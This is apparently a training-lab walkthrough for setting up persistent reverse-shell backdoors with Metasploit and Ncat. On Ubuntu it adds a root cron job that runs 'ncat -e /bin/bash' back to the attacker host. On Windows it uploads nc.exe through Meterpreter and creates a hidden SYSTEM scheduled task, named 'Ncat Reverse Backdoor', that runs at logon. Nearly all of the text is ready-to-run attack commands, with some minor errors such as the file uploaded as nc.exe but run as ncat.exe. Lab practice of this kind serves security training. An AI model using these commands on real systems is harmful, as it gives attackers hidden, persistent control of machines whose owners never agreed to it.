Open up a terminal window and start the listener in order to see the current active sessions.

`msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.100.100; set LPORT 4443;set ExitOnSession false;exploit -j -z;"`

## Infiltrating Ubuntu

You can check "sessions" in msfconole using `sessions`
Let's start with the Ubuntu machine.
`sessions 1`

Using `shell` we can interact with the machine as _"Root"_

Knowing that, use `echo "* * * * * ncat -e /bin/bash 192.168.100.100 4444" >> /var/spool/cron/crontabs/root` in order to create a new cronjob on the Root account that will allow you to get a reverse shell at any given time.
#### Stabilizing the Shell

After successfully gaining the reverse shell, it's usually missing autocompletion and symbol deletion options, among other features.
In order to have a fully interactive shell, you must stabilize it.

Using the following steps, continue to stablize the shell using Python.

_Import pty module and spawn bash shell:_ 
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Press _(CTRL + Z )_ to background process and get back to your host machine.

Use _stty_ command to set terminal line settings and foreground back the target terminal:
`stty raw -echo; fg`

Set the terminal emulator to xterm: `export TERM=xterm`

Now that the shell is fully interactive and stabilized, use `whoami` to double-check the current user privileges and ensure you have the expected level of access on the target system.
## Infiltrating Windows

Using Ncat as a Trojan on Windows requires a more advanced approach, and for this, we will utilize the Meterpreter shell along with the robust capabilities of MSFConsole.

First, return to the initial terminal and exit the Ubuntu session by pressing (_CTRL + C_ ). This will allow us to establish a connection to the Windows machine. Once disconnected from Ubuntu, reconnect to the Windows session by entering:
`sessions 2`

To maintain persistence on the target system using Ncat as a Trojan, we must use MSFConsole's _Upload_ feature to transfer the Ncat executable from the Kali machine to the target Windows machine using the following command:

`upload /usr/share/windows-binaries/nc.exe C:\users\labuser\downloads`

`execute -f cmd.exe -i -H`

This command runs _cmd.exe_ interactively and hides the process, allowing you to execute commands on the target system without visibility to the user.

`schtasks /create /sc onlogon /tn "Ncat Reverse Backdoor" /tr "C:\users\labuser\downloads\ncat.exe 192.168.100.100 4445 -e cmd.exe" /ru SYSTEM`

This command creates a scheduled task named "Ncat Reverse Backdoor" that runs on user logon and executes ncat.exe to connect back to the attacker's IP (192.168.100.100) on port 4445, launching a command prompt as the SYSTEM user.

Ensure that the scheduled task named "Ncat Reverse Backdoor" has been created successfully:
`schtasks /query /tn "Ncat Reverse Backdoor"`

We have to upload as nc.exe is not available on widows by default

With the scheduled task successfully created and verified, suspend the interactive session by pressing _CTRL + Z_ to return to the Meterpreter shell.

From the Meterpreter shell, issue the `reboot` command to restart the Windows machine, which will trigger the scheduled task and initiate the reverse shell connection.

Next, open a new terminal window and start the listener by entering the following command:
`nc -lvp 4445`

Once the reverse shell connection is established, confirm it by using commands such as `dir` or `systeminfo` to verify access to the target system.
